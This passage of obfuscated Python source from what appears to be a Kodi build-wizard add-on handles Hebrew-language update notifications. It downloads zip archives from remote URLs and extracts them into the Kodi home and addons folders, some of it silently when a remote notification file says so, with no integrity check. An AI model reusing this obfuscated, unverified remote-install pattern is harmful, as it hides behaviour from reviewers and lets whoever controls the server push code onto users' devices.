				if not OOOO00000000000OO ==False :#line:5165
					try :#line:5166
						OOOO00000000000OO =int (OOOO00000000000OO );OOOO000O0OO00OO0O =int (OOOO000O0OO00OO0O )#line:5167
						checkidupdate ()#line:5168
						wiz .setS ("notedismiss","true")#line:5169
						if OOOO00000000000OO ==OOOO000O0OO00OO0O :#line:5170
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOO00000000000OO ),xbmc .LOGNOTICE )#line:5171
						elif OOOO00000000000OO >OOOO000O0OO00OO0O :#line:5173
							wiz .log ("[Notifications] id: %s"%str (OOOO00000000000OO ),xbmc .LOGNOTICE )#line:5174
							wiz .setS ('noteid',str (OOOO00000000000OO ))#line:5175
							wiz .setS ("notedismiss","true")#line:5176
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5179
					except Exception as OO0O0OOOOOOOOOO00 :#line:5180
						wiz .log ("Error on Notifications Window: %s"%str (OO0O0OOOOOOOOOO00 ),xbmc .LOGERROR )#line:5181
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5183
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0000O0O0OOO0OOO0 ),xbmc .LOGNOTICE )#line:5184
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5185
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5186
def updatetelemedia (O0O0O000O0OO0O00O ):#line:5188
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5190
    time .sleep (15.0 )#line:5191
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5192
        O0O00O00OOO0OOOOO =(ADDON .getSetting ("autoupdate"))#line:5193
        STARTP2 ()#line:5194
        if not NOTIFY =='true':#line:5195
            OO0OOOOOOO00O00OO =wiz .workingURL (NOTIFICATION )#line:5196
            if OO0OOOOOOO00O00OO ==True :#line:5197
                O00OOO0O00OOOOO00 ,OO0OO0O000OO0OO0O =wiz .splitNotify (NOTIFICATION )#line:5198
                if not O00OOO0O00OOOOO00 ==False :#line:5199
                    try :#line:5200
                        O00OOO0O00OOOOO00 =int (O00OOO0O00OOOOO00 );O0O0O000O0OO0O00O =int (O0O0O000O0OO0O00O )#line:5201
                        if O00OOO0O00OOOOO00 ==O0O0O000O0OO0O00O :#line:5202
                            if NOTEDISMISS =='false':#line:5203
                                debridit .debridIt ('update','all')#line:5204
                                traktit .traktIt ('update','all')#line:5205
                                checkidupdatetele ()#line:5206
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (O00OOO0O00OOOOO00 ),xbmc .LOGNOTICE )#line:5207
                        elif O00OOO0O00OOOOO00 >O0O0O000O0OO0O00O :#line:5208
                            wiz .log ("[Notifications] id: %s"%str (O00OOO0O00OOOOO00 ),xbmc .LOGNOTICE )#line:5209
                            wiz .setS ('noteid',str (O00OOO0O00OOOOO00 ))#line:5210
                            wiz .setS ('notedismiss','false')#line:5211
                            if O0O00O00OOO0OOOOO =='true':#line:5212
                                debridit .debridIt ('update','all')#line:5213
                                traktit .traktIt ('update','all')#line:5214
                                checkidupdatetele ()#line:5215
                            else :notify .notification (msg =OO0OO0O000OO0OO0O )#line:5216
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5217
                    except Exception as O00OOOO0O0O000O00 :#line:5218
                        wiz .log ("Error on Notifications Window: %s"%str (O00OOOO0O0O000O00 ),xbmc .LOGERROR )#line:5219
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5220
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0OOOOOOO00O00OO ),xbmc .LOGNOTICE )#line:5221
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5222
def checkidupdate ():#line:5226
				wiz .setS ("notedismiss","true")#line:5228
				O0O0O0OO0O0000OOO =wiz .workingURL (NOTIFICATION )#line:5229
				OO0OO0000OOO00OOO =" Kodi Premium"#line:5231
				O0O0OO0O0O0OOOO00 =wiz .checkBuild (OO0OO0000OOO00OOO ,'gui')#line:5232
				OOOOOO00O0OOO00O0 =OO0OO0000OOO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5233
				if not wiz .workingURL (O0O0OO0O0O0OOOO00 )==True :return #line:5234
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5235
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OO0000OOO00OOO ),'','אנא המתן')#line:5236
				O00OOO0O000OO0000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO00O0OOO00O0 )#line:5237
				try :os .remove (O00OOO0O000OO0000 )#line:5238
				except :pass #line:5239
				logging .warning (O0O0OO0O0O0OOOO00 )#line:5240
				if 'google'in O0O0OO0O0O0OOOO00 :#line:5241
				   OO0O000OO0000OO00 =googledrive_download (O0O0OO0O0O0OOOO00 ,O00OOO0O000OO0000 ,DP ,wiz .checkBuild (OO0OO0000OOO00OOO ,'filesize'))#line:5242
				else :#line:5245
				  downloader .download (O0O0OO0O0O0OOOO00 ,O00OOO0O000OO0000 ,DP )#line:5246
				xbmc .sleep (100 )#line:5247
				OO0OO0000OO0OOO00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0000OOO00OOO )#line:5248
				DP .update (0 ,OO0OO0000OO0OOO00 ,'','אנא המתן')#line:5249
				extract .all (O00OOO0O000OO0000 ,HOME ,DP ,title =OO0OO0000OO0OOO00 )#line:5250
				DP .close ()#line:5251
				wiz .defaultSkin ()#line:5252
				wiz .lookandFeelData ('save')#line:5253
				if KODIV >=18 :#line:5254
					skindialogsettind18 ()#line:5255
				if INSTALLMETHOD ==1 :OOO0O000OOO00OO00 =1 #line:5258
				elif INSTALLMETHOD ==2 :OOO0O000OOO00OO00 =0 #line:5259
				else :DP .close ()#line:5260
def checkidupdatetele ():#line:5261
				wiz .setS ("notedismiss","true")#line:5263
				O0O00O0O000OOOOO0 =wiz .workingURL (NOTIFICATION )#line:5264
				OOO0O00O0O0O00OOO =" Kodi Premium"#line:5266
				OO00O000O00O00O00 =wiz .checkBuild (OOO0O00O0O0O00OOO ,'gui')#line:5267
				O00O0OOOO00OOOOO0 =OOO0O00O0O0O00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5268
				if not wiz .workingURL (OO00O000O00O00O00 )==True :return #line:5269
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5270
				OOO000OOOO0OOO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0OOOO00OOOOO0 )#line:5273
				try :os .remove (OOO000OOOO0OOO0OO )#line:5274
				except :pass #line:5275
				if 'google'in OO00O000O00O00O00 :#line:5277
				   OOOO0O0OO00OO0O0O =googledrive_download (OO00O000O00O00O00 ,OOO000OOOO0OOO0OO ,DP2 ,wiz .checkBuild (OOO0O00O0O0O00OOO ,'filesize'))#line:5278
				else :#line:5281
				  downloaderbg .download3 (OO00O000O00O00O00 ,OOO000OOOO0OOO0OO ,DP2 )#line:5282
				xbmc .sleep (100 )#line:5283
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5284
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5286
				extract .all2 (OOO000OOOO0OOO0OO ,HOME ,DP2 )#line:5288
				DP2 .close ()#line:5289
				wiz .defaultSkin ()#line:5290
				wiz .lookandFeelData ('save')#line:5291
				wiz .kodi17Fix ()#line:5292
				if KODIV >=18 :#line:5293
					skindialogsettind18 ()#line:5294
				debridit .debridIt ('restore','all')#line:5299
				traktit .traktIt ('restore','all')#line:5300
				if INSTALLMETHOD ==1 :OO000OOO0O0OO0000 =1 #line:5301
				elif INSTALLMETHOD ==2 :OO000OOO0O0OO0000 =0 #line:5302
				else :DP2 .close ()#line:5303
				OOOO0000000OOO00O =(NOTIFICATION2 )#line:5304
				O00OO0OO0OOOOOO0O =urllib2 .urlopen (OOOO0000000OOO00O )#line:5305
				O0OO0O0O0O0O0OO00 =O00OO0OO0OOOOOO0O .readlines ()#line:5306
				O0O0OO000000000O0 =0 #line:5307
				for OO0000OO0OO00000O in O0OO0O0O0O0O0OO00 :#line:5310
					if OO0000OO0OO00000O .split (' ==')[0 ]=="noreset"or OO0000OO0OO00000O .split ()[0 ]=="noreset":#line:5311
						xbmc .executebuiltin ("ReloadSkin()")#line:5313
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5314
						O00OO0O0000OOO0O0 =(ADDON .getSetting ("message"))#line:5315
						if O00OO0O0000OOO0O0 =='true':#line:5316
							infobuild ()#line:5317
						update_Votes ()#line:5318
						indicatorfastupdate ()#line:5319
					if OO0000OO0OO00000O .split (' ==')[0 ]=="reset"or OO0000OO0OO00000O .split ()[0 ]=="reset":#line:5320
						update_Votes ()#line:5322
						indicatorfastupdate ()#line:5323
						resetkodi ()#line:5324
def gaiaserenaddon ():#line:5325
  O0OO0OOOOO0OO0000 =(ADDON .getSetting ("gaiaseren"))#line:5326
  OOO00000O0000OO00 =(ADDON .getSetting ("auto_rd"))#line:5327
  if O0OO0OOOOO0OO0000 =='true'and OOO00000O0000OO00 =='true':#line:5328
    OO0OO0O000O0O000O =(NEWFASTUPDATE )#line:5329
    O00000OOOO0O0O0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5330
    O0OOOO0O00OOO0OOO =xbmcgui .DialogProgress ()#line:5331
    O0OOOO0O00OOO0OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5332
    OO000OO0000000OOO =os .path .join (PACKAGES ,'isr.zip')#line:5333
    O00O0OOOOOO0OO00O =urllib2 .Request (OO0OO0O000O0O000O )#line:5334
    OOOOOO00000O0O00O =urllib2 .urlopen (O00O0OOOOOO0OO00O )#line:5335
    O00OO00O000OO0OO0 =xbmcgui .DialogProgress ()#line:5337
    O00OO00O000OO0OO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5338
    O00OO00O000OO0OO0 .update (0 )#line:5339
    OOOOO0OOOO0O0OO0O =open (OO000OO0000000OOO ,'wb')#line:5341
    try :#line:5343
      O0O00O00OOOO0O0O0 =OOOOOO00000O0O00O .info ().getheader ('Content-Length').strip ()#line:5344
      OOOO00OOOO000O00O =True #line:5345
    except AttributeError :#line:5346
          OOOO00OOOO000O00O =False #line:5347
    if OOOO00OOOO000O00O :#line:5349
          O0O00O00OOOO0O0O0 =int (O0O00O00OOOO0O0O0 )#line:5350
    OOO00O0O000O0O0OO =0 #line:5352
    OO0O00OOOOO0O00OO =time .time ()#line:5353
    while True :#line:5354
          O00OOO0OOOO0O0OOO =OOOOOO00000O0O00O .read (8192 )#line:5355
          if not O00OOO0OOOO0O0OOO :#line:5356
              sys .stdout .write ('\n')#line:5357
              break #line:5358
          OOO00O0O000O0O0OO +=len (O00OOO0OOOO0O0OOO )#line:5360
          OOOOO0OOOO0O0OO0O .write (O00OOO0OOOO0O0OOO )#line:5361
          if not OOOO00OOOO000O00O :#line:5363
              O0O00O00OOOO0O0O0 =OOO00O0O000O0O0OO #line:5364
          if O00OO00O000OO0OO0 .iscanceled ():#line:5365
             O00OO00O000OO0OO0 .close ()#line:5366
             try :#line:5367
              os .remove (OO000OO0000000OOO )#line:5368
             except :#line:5369
              pass #line:5370
             break #line:5371
          OOOOO00O00O0O0OOO =float (OOO00O0O000O0O0OO )/O0O00O00OOOO0O0O0 #line:5372
          OOOOO00O00O0O0OOO =round (OOOOO00O00O0O0OOO *100 ,2 )#line:5373
          OO00O0OO0O0000OO0 =OOO00O0O000O0O0OO /(1024 *1024 )#line:5374
          O0O0000000OOO0000 =O0O00O00OOOO0O0O0 /(1024 *1024 )#line:5375
          OOO00000OOO00OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O0OO0O0000OO0 ,'teal',O0O0000000OOO0000 )#line:5376
          if (time .time ()-OO0O00OOOOO0O00OO )>0 :#line:5377
            O0OO0O00OO0OO0000 =OOO00O0O000O0O0OO /(time .time ()-OO0O00OOOOO0O00OO )#line:5378
            O0OO0O00OO0OO0000 =O0OO0O00OO0OO0000 /1024 #line:5379
          else :#line:5380
           O0OO0O00OO0OO0000 =0 #line:5381
          O0O000OO00OO0OO0O ='KB'#line:5382
          if O0OO0O00OO0OO0000 >=1024 :#line:5383
             O0OO0O00OO0OO0000 =O0OO0O00OO0OO0000 /1024 #line:5384
             O0O000OO00OO0OO0O ='MB'#line:5385
          if O0OO0O00OO0OO0000 >0 and not OOOOO00O00O0O0OOO ==100 :#line:5386
              O0OO0O0OO00OO0O00 =(O0O00O00OOOO0O0O0 -OOO00O0O000O0O0OO )/O0OO0O00OO0OO0000 #line:5387
          else :#line:5388
              O0OO0O0OO00OO0O00 =0 #line:5389
          OOO00000OOOO0O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0O00OO0OO0000 ,O0O000OO00OO0OO0O )#line:5390
          O00OO00O000OO0OO0 .update (int (OOOOO00O00O0O0OOO ),OOO00000OOO00OO0O ,OOO00000OOOO0O0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5392
    O0O0O00OOOOOOOO0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5395
    OOOOO0OOOO0O0OO0O .close ()#line:5398
    extract .all (OO000OO0000000OOO ,O0O0O00OOOOOOOO0O ,O00OO00O000OO0OO0 )#line:5399
    try :#line:5403
      os .remove (OO000OO0000000OOO )#line:5404
    except :#line:5405
      pass #line:5406
def iptvsimpldownpc ():#line:5407
    OOOO000000O0O0OO0 =(IPTVSIMPL18PC )#line:5409
    OO0000OOOOO000O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5410
    OO0OO0O00O000000O =xbmcgui .DialogProgress ()#line:5411
    OO0OO0O00O000000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5412
    OOOO0O0OOO0OO00O0 =os .path .join (PACKAGES ,'isr.zip')#line:5413
    O00O0000000000000 =urllib2 .Request (OOOO000000O0O0OO0 )#line:5414
    OOO00OOO0O0O000O0 =urllib2 .urlopen (O00O0000000000000 )#line:5415
    O00OOOOO0O00000O0 =xbmcgui .DialogProgress ()#line:5417
    O00OOOOO0O00000O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5418
    O00OOOOO0O00000O0 .update (0 )#line:5419
    O0OOOOOO00O000OO0 =open (OOOO0O0OOO0OO00O0 ,'wb')#line:5421
    try :#line:5423
      OOOOO0O0OO000OO0O =OOO00OOO0O0O000O0 .info ().getheader ('Content-Length').strip ()#line:5424
      OOOOO00OO00O00O0O =True #line:5425
    except AttributeError :#line:5426
          OOOOO00OO00O00O0O =False #line:5427
    if OOOOO00OO00O00O0O :#line:5429
          OOOOO0O0OO000OO0O =int (OOOOO0O0OO000OO0O )#line:5430
    OO00O0000O0OO0000 =0 #line:5432
    O000OOOOO0OOO00OO =time .time ()#line:5433
    while True :#line:5434
          OO0O0OO0O0O00O00O =OOO00OOO0O0O000O0 .read (8192 )#line:5435
          if not OO0O0OO0O0O00O00O :#line:5436
              sys .stdout .write ('\n')#line:5437
              break #line:5438
          OO00O0000O0OO0000 +=len (OO0O0OO0O0O00O00O )#line:5440
          O0OOOOOO00O000OO0 .write (OO0O0OO0O0O00O00O )#line:5441
          if not OOOOO00OO00O00O0O :#line:5443
              OOOOO0O0OO000OO0O =OO00O0000O0OO0000 #line:5444
          if O00OOOOO0O00000O0 .iscanceled ():#line:5445
             O00OOOOO0O00000O0 .close ()#line:5446
             try :#line:5447
              os .remove (OOOO0O0OOO0OO00O0 )#line:5448
             except :#line:5449
              pass #line:5450
             break #line:5451
          OOO000OOOO00000OO =float (OO00O0000O0OO0000 )/OOOOO0O0OO000OO0O #line:5452
          OOO000OOOO00000OO =round (OOO000OOOO00000OO *100 ,2 )#line:5453
          O00O00O0OO0O000O0 =OO00O0000O0OO0000 /(1024 *1024 )#line:5454
          O00OO0000OO00O0OO =OOOOO0O0OO000OO0O /(1024 *1024 )#line:5455
          OO0O00OOO00OOOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O00O0OO0O000O0 ,'teal',O00OO0000OO00O0OO )#line:5456
          if (time .time ()-O000OOOOO0OOO00OO )>0 :#line:5457
            OO0O0O0O0O00O0O00 =OO00O0000O0OO0000 /(time .time ()-O000OOOOO0OOO00OO )#line:5458
            OO0O0O0O0O00O0O00 =OO0O0O0O0O00O0O00 /1024 #line:5459
          else :#line:5460
           OO0O0O0O0O00O0O00 =0 #line:5461
          O00OOOOOO0O0OO0OO ='KB'#line:5462
          if OO0O0O0O0O00O0O00 >=1024 :#line:5463
             OO0O0O0O0O00O0O00 =OO0O0O0O0O00O0O00 /1024 #line:5464
             O00OOOOOO0O0OO0OO ='MB'#line:5465
          if OO0O0O0O0O00O0O00 >0 and not OOO000OOOO00000OO ==100 :#line:5466
              OO0O0000O0O0O0000 =(OOOOO0O0OO000OO0O -OO00O0000O0OO0000 )/OO0O0O0O0O00O0O00 #line:5467
          else :#line:5468
              OO0O0000O0O0O0000 =0 #line:5469
          O000OOOO00OO0OOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O0O0O0O00O0O00 ,O00OOOOOO0O0OO0OO )#line:5470
          O00OOOOO0O00000O0 .update (int (OOO000OOOO00000OO ),OO0O00OOO00OOOOOO ,O000OOOO00OO0OOOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5472
    O00OO0000OOO000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5475
    O0OOOOOO00O000OO0 .close ()#line:5478
    extract .all (OOOO0O0OOO0OO00O0 ,O00OO0000OOO000O0 ,O00OOOOO0O00000O0 )#line:5479
    try :#line:5483
      os .remove (OOOO0O0OOO0OO00O0 )#line:5484
    except :#line:5485
      pass #line:5486
def iptvsimpldown ():#line:5487
    O0000OOO0000OOO00 =(IPTV18 )#line:5489
    O00OOOO000O0O00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5490
    OO0O000O0OO000O00 =xbmcgui .DialogProgress ()#line:5491
    OO0O000O0OO000O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5492
    OOOOO0OOOOO000OOO =os .path .join (PACKAGES ,'isr.zip')#line:5493
    O0000O0OO000000O0 =urllib2 .Request (O0000OOO0000OOO00 )#line:5494
    OO0OOO0000OOOOOO0 =urllib2 .urlopen (O0000O0OO000000O0 )#line:5495
    O0OOOO0O0OO00O000 =xbmcgui .DialogProgress ()#line:5497
    O0OOOO0O0OO00O000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5498
    O0OOOO0O0OO00O000 .update (0 )#line:5499
    OOO0O00O0O0O0O0OO =open (OOOOO0OOOOO000OOO ,'wb')#line:5501
    try :#line:5503
      O00000OOO000O00O0 =OO0OOO0000OOOOOO0 .info ().getheader ('Content-Length').strip ()#line:5504
      OOO00O0OOO00OO0O0 =True #line:5505
    except AttributeError :#line:5506
          OOO00O0OOO00OO0O0 =False #line:5507
    if OOO00O0OOO00OO0O0 :#line:5509
          O00000OOO000O00O0 =int (O00000OOO000O00O0 )#line:5510
    OOO0000O0O000OOO0 =0 #line:5512
    O0O0O0O00O0000OO0 =time .time ()#line:5513
    while True :#line:5514
          OOO0OO00OOOOOO0O0 =OO0OOO0000OOOOOO0 .read (8192 )#line:5515
          if not OOO0OO00OOOOOO0O0 :#line:5516
              sys .stdout .write ('\n')#line:5517
              break #line:5518
          OOO0000O0O000OOO0 +=len (OOO0OO00OOOOOO0O0 )#line:5520
          OOO0O00O0O0O0O0OO .write (OOO0OO00OOOOOO0O0 )#line:5521
          if not OOO00O0OOO00OO0O0 :#line:5523
              O00000OOO000O00O0 =OOO0000O0O000OOO0 #line:5524
          if O0OOOO0O0OO00O000 .iscanceled ():#line:5525
             O0OOOO0O0OO00O000 .close ()#line:5526
             try :#line:5527
              os .remove (OOOOO0OOOOO000OOO )#line:5528
             except :#line:5529
              pass #line:5530
             break #line:5531
          O00OO00O000000O00 =float (OOO0000O0O000OOO0 )/O00000OOO000O00O0 #line:5532
          O00OO00O000000O00 =round (O00OO00O000000O00 *100 ,2 )#line:5533
          OO0O0O000O00000O0 =OOO0000O0O000OOO0 /(1024 *1024 )#line:5534
          OO000O0OO0OO0O0O0 =O00000OOO000O00O0 /(1024 *1024 )#line:5535
          OO0O00OO0OOO0OOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0O000O00000O0 ,'teal',OO000O0OO0OO0O0O0 )#line:5536
          if (time .time ()-O0O0O0O00O0000OO0 )>0 :#line:5537
            O0OO0O0OO0000OOOO =OOO0000O0O000OOO0 /(time .time ()-O0O0O0O00O0000OO0 )#line:5538
            O0OO0O0OO0000OOOO =O0OO0O0OO0000OOOO /1024 #line:5539
          else :#line:5540
           O0OO0O0OO0000OOOO =0 #line:5541
          OO000000OOOO0OO0O ='KB'#line:5542
          if O0OO0O0OO0000OOOO >=1024 :#line:5543
             O0OO0O0OO0000OOOO =O0OO0O0OO0000OOOO /1024 #line:5544
             OO000000OOOO0OO0O ='MB'#line:5545
          if O0OO0O0OO0000OOOO >0 and not O00OO00O000000O00 ==100 :#line:5546
              O0OOOOOOOO00O0OOO =(O00000OOO000O00O0 -OOO0000O0O000OOO0 )/O0OO0O0OO0000OOOO #line:5547
          else :#line:5548
              O0OOOOOOOO00O0OOO =0 #line:5549
          O000OO0OO000O0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0O0OO0000OOOO ,OO000000OOOO0OO0O )#line:5550
          O0OOOO0O0OO00O000 .update (int (O00OO00O000000O00 ),OO0O00OO0OOO0OOOO ,O000OO0OO000O0O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5552
    O00OOO0OOOOO000OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5555
    OOO0O00O0O0O0O0OO .close ()#line:5558
    extract .all (OOOOO0OOOOO000OOO ,O00OOO0OOOOO000OO ,O0OOOO0O0OO00O000 )#line:5559
    try :#line:5563
      os .remove (OOOOO0OOOOO000OOO )#line:5564
    except :#line:5565
      pass #line:5566
def testnotify ():#line:5567
	O0OO0OOO0OOOO000O =wiz .workingURL (NOTIFICATION )#line:5568
	if O0OO0OOO0OOOO000O ==True :#line:5569
		try :#line:5570
			OO0O000000OO0OO0O ,OO000OOOO00O0000O =wiz .splitNotify (NOTIFICATION )#line:5571
			if OO0O000000OO0OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5572
			if STARTP2 ()=='ok':#line:5573
				notify .notification (OO000OOOO00O0000O ,True )#line:5574
		except Exception as O0OO00OOOOOOO0OO0 :#line:5575
			wiz .log ("Error on Notifications Window: %s"%str (O0OO00OOOOOOO0OO0 ),xbmc .LOGERROR )#line:5576
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5577
def testnotify2 ():#line:5578
	O0000OOO0OO0O000O =wiz .workingURL (NOTIFICATION2 )#line:5579
	if O0000OOO0OO0O000O ==True :#line:5580
		try :#line:5581
			O00OO0OO0OO0O00OO ,OO0O000OOO0O0OO0O =wiz .splitNotify (NOTIFICATION2 )#line:5582
			if O00OO0OO0OO0O00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5583
			if STARTP2 ()=='ok':#line:5584
				notify .notification2 (OO0O000OOO0O0OO0O ,True )#line:5585
		except Exception as OOO0O00O0OO0O00O0 :#line:5586
			wiz .log ("Error on Notifications Window: %s"%str (OOO0O00O0OO0O00O0 ),xbmc .LOGERROR )#line:5587
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5588
def testnotify3 ():#line:5589
	O0OO00O0OOOO0OOOO =wiz .workingURL (NOTIFICATION3 )#line:5590
	if O0OO00O0OOOO0OOOO ==True :#line:5591
		try :#line:5592
			O0OOO0OO00000OOOO ,O0OO0OOO0O0OOO0OO =wiz .splitNotify (NOTIFICATION3 )#line:5593
			if O0OOO0OO00000OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5594
			if STARTP2 ()=='ok':#line:5595
				notify .notification3 (O0OO0OOO0O0OOO0OO ,True )#line:5596
		except Exception as OOOOOO0O000OO0OOO :#line:5597
			wiz .log ("Error on Notifications Window: %s"%str (OOOOOO0O000OO0OOO ),xbmc .LOGERROR )#line:5598
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5599
def wait ():#line:5600
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:5601
def infobuild ():#line:5602
	OO00O0O0O0O0O000O =wiz .workingURL (NOTIFICATION )#line:5603
	if OO00O0O0O0O0O000O ==True :#line:5604
		try :#line:5605
			OOOOO0O0OOOO0OOOO ,O0O0O000OOOO0OOO0 =wiz .splitNotify (NOTIFICATION )#line:5606
			if OOOOO0O0OOOO0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5607
			if STARTP2 ()=='ok':#line:5608
				notify .updateinfo (O0O0O000OOOO0OOO0 ,True )#line:5609
		except Exception as O0O000O0O0OO00000 :#line:5610
			wiz .log ("Error on Notifications Window: %s"%str (O0O000O0O0OO00000 ),xbmc .LOGERROR )#line:5611
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5612
def servicemanual ():#line:5613
	OOO0O000OO0OOO00O =wiz .workingURL (HELPINFO )#line:5614
	if OOO0O000OO0OOO00O ==True :#line:5615
		try :#line:5616
			OO00OOOOO0O000000 ,O0OOO0O0OOOO0O0OO =wiz .splitNotify (HELPINFO )#line:5617
			if OO00OOOOO0O000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5618
			notify .helpinfo (O0OOO0O0OOOO0O0OO ,True )#line:5619
		except Exception as OOO00OO000000O000 :#line:5620
			wiz .log ("Error on Notifications Window: %s"%str (OOO00OO000000O000 ),xbmc .LOGERROR )#line:5621
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5622
def testupdate ():#line:5624
	if BUILDNAME =="":#line:5625
		notify .updateWindow ()#line:5626
	else :#line:5627
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5628
def testfirst ():#line:5630
	notify .firstRun ()#line:5631
def testfirstRun ():#line:5633
	notify .firstRunSettings ()#line:5634
def fastinstall ():#line:5637
	notify .firstRuninstall ()#line:5638
def addDir (O0000OOO0OOOOO00O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5645
	OOO00O00O0OOOO000 =sys .argv [0 ]#line:5646
	if not mode ==None :OOO00O00O0OOOO000 +="?mode=%s"%urllib .quote_plus (mode )#line:5647
